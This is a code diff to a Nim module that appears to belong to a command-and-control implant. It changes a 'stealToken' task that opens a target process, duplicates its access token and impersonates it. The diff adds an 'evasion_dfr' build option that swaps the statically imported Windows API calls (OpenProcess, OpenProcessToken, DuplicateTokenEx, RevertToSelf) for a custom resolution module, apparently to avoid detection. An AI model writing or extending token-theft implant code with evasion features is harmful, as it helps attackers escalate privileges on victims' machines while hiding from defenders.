@@ -5,7 +5,11 @@ import ../utils/strenc
 import token_manager
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except OpenProcess, OpenProcessToken, DuplicateTokenEx, RevertToSelf
+    import ../utils/winapi
+  else:
+    import winim/lean
   
   proc stealToken*(taskId: string, params: JsonNode): JsonNode =
     ## Steal a token from a target process
@@ -39,13 +43,11 @@ when defined(windows):
       # SecurityImpersonation = 2 (SECURITY_IMPERSONATION_LEVEL enum)
       # TokenImpersonation = 2 (TOKEN_TYPE enum)
       var impersonationToken: HANDLE = 0
-      const SecurityImpersonationLevel = 2.DWORD
-      const TokenImpersonationType = 2.DWORD
       
-      debugLog "steal_token", &"About to duplicate token with SecurityLevel={SecurityImpersonationLevel}, TokenType={TokenImpersonationType}"
+      debugLog "steal_token", "About to duplicate token with SecurityImpersonation, TokenImpersonation"
       
-      if DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nil, SecurityImpersonationLevel, 
-                          TokenImpersonationType, addr impersonationToken) == 0:
+      if DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nil, securityImpersonation, 
+                          tokenImpersonation, addr impersonationToken) == 0:
         let errorCode = GetLastError()
         CloseHandle(processToken)
         CloseHandle(processHandle)
